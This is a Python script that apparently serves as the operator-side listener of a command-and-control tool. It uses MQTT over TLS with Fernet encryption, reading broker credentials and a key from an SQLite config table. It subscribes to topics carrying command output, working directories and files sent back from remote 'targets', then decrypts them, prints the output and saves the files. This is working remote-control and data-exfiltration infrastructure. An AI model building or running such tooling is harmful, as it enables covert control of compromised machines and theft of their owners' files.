import paho.mqtt.client as mqtt
from cryptography.fernet import Fernet
import os
import base64
from collections import namedtuple
import sqlite3


dbfile = (os.path.dirname(os.path.realpath(__file__))+"/mqt-config.db")
timeout = 1
AL = namedtuple('AL', 'Transport Address Port User Pass Key')
conn = sqlite3.connect(dbfile)
conn.isolation_level = None
conn.row_factory = lambda cursor, row: AL(*row)
cursor = conn.cursor()
for row in cursor.execute("SELECT Transport, Address, Port, User, Pass, Key from listener WHERE Active = 'yes'"):
	atrans=str(row.Transport)
	broker=str(row.Address)
	port=int(row.Port)
	username=str(row.User)
	password=str(row.Pass)
	key2=bytes(row.Key)
conn.close()
cipher = Fernet(key2)
agent = ""
# Set up connection
client = mqtt.Client(transport=atrans)
client.tls_set()
client.username_pw_set(username, password)
client.connect(broker, port, 60)
# Define subscriptions
topic_out = "output/#"
topic_err = "error/#"
topic_cwd = "cwd/#"
topic_dl = "target/+/dl/"
topic_dln = "target/+/dln/"


def on_connect(client, userdata, flags, rc):
    client.subscribe(topic_out)
    client.subscribe(topic_err)
    client.subscribe(topic_cwd)
    client.subscribe(topic_dl)
    client.subscribe(topic_dln)
def on_message(client, userdata, msg):
	decrypted_message = cipher.decrypt(msg.payload)
	output = str(decrypted_message.decode('UTF-8'))
	print("\r\n"+output+" ", end="")
def on_download_name(client,userdata,msg):
	decrypted_message7 = cipher.decrypt(msg.payload)
	global dlfn
	dlfn = str(decrypted_message7.decode('UTF-8'))
def on_download(client, userdata, msg):
	decrypted_file = cipher.decrypt(msg.payload)
	save_download(decrypted_file, dlfn)
def save_download(payload, filename):
	f=open(filename, "wb")
	f.write(payload)
	f.close()
	print(dlfn+' was downloaded.')
	
def Main():
	client = mqtt.Client(transport=atrans)
	client.tls_set()
	client.message_callback_add(topic_dl,on_download)
	client.message_callback_add(topic_dln,on_download_name)
	client.on_connect = on_connect
	client.on_message = on_message
	client.username_pw_set(username, password)
	client.connect(broker, port, 60)
	client.loop_forever()
